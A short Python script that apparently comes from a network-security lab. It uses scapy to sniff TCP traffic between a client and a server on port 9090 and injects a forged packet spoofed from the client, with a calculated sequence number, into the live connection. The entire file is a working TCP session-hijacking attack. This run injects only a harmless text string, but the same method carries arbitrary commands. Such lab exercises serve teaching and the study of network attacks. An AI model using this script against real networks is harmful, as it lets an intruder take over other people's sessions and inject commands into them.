#!/usr/bin/python3
from scapy.all import *
# Client IP : 10.0.2.15
# Server IP : 10.0.2.5
# Attacker IP : 10.0.2.6
def spoof(pkt):
  old_ip = pkt[IP]
  old_tcp = pkt[TCP]
  
  newseq = old_tcp.seq + 4
  newack = old_tcp.ack 
  ip = IP(src = "10.0.2.15", dst = "10.0.2.5")
  tcp = TCP(sport = old_tcp.sport, dport = 9090, flags = "PA", seq = newseq, ack = newack)
  data = "\nHanging the session...!\n"
  pkt = ip/tcp/data
  ls(pkt)
  send(pkt, verbose = 0)

  quit()

myFilter = 'tcp and src host 10.0.2.15 and dst host 10.0.2.5 and dst port 9090'
sniff(filter = myFilter, prn=spoof)